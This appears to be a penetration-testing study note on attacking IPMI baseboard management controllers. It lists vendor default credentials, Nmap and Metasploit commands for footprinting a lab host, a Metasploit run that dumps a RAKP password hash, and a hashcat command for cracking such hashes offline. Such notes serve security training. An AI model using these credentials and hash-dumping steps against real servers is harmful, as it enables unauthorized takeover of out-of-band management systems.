# IPMI

* IPMI you would be able to execute remote commands
* Intelligent Platform Management Interface
* works independently from the host os
  * can work when the system is shutdown
  * Before the OS has booted to modify BIOS settings
  * When the host is fully powered down
  * Access to a host after a system failure
* IPMI requires the following components:
  * Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI
  * Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another
  * Intelligent Platform Management Bus (IPMB) - extends the BMC
  * IPMI Memory - stores things such as the system event log, repository store data, and more
  * Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus
* Some unique default passwords to keep in our cheatsheets include:

| Product         | Username      | Password                                                                  |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |

### Footprinting the Service

#### Nmap

```shell-session
 sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

```shell-session
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

#### Metasploit Version Scan

```
msfconsole
```

```shell-session
 use auxiliary/scanner/ipmi/ipmi_version 
```

```shell-session
set rhosts 10.129.42.195
```

```shell-session
show options 
```

```shell-session

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads
```

```shell-session
run
```

```
[*] Sending IPMI requests to 10.129.160.115->10.129.160.115 (1 hosts)
[+] 10.129.160.115:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

#### Metasploit Dumping Hashes

```
msfconsole
```

```shell-session
use auxiliary/scanner/ipmi/ipmi_dumphashes 
```

```shell-session
set rhosts 10.129.42.195
```

```shell-session
show options 
```

```shell-session
run
```

```

[+] 10.129.160.115:623 - IPMI - Hash found: admin:5cd4450782000000067fb9f6e152cfab613715ed4a90c340a862a5f4d2badb80ba70abad42852effa123456789abcdefa123456789abcdef140561646d696e:b3389ffe57d4c8005c12650ab4f38f3463b72b84
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

**for above command**

* can set PASS\_FILE

```
set PASS_FILE /usr/share/wordlists/seclists/Passwords/bt4-password.txt
```

```
run
```

### Dangerous Settings

* If default credentials do not work to access a BMC, we can turn to a [flaw](http://fish2.com/ipmi/remote-pw-cracking.html) in the RAKP protocol in IPMI 2.0.
  * &#x20;During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place.
  * can be leveraged to obtain the password hash for ANY valid user account on the BMC.
    * can be cracked offline
      * `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`
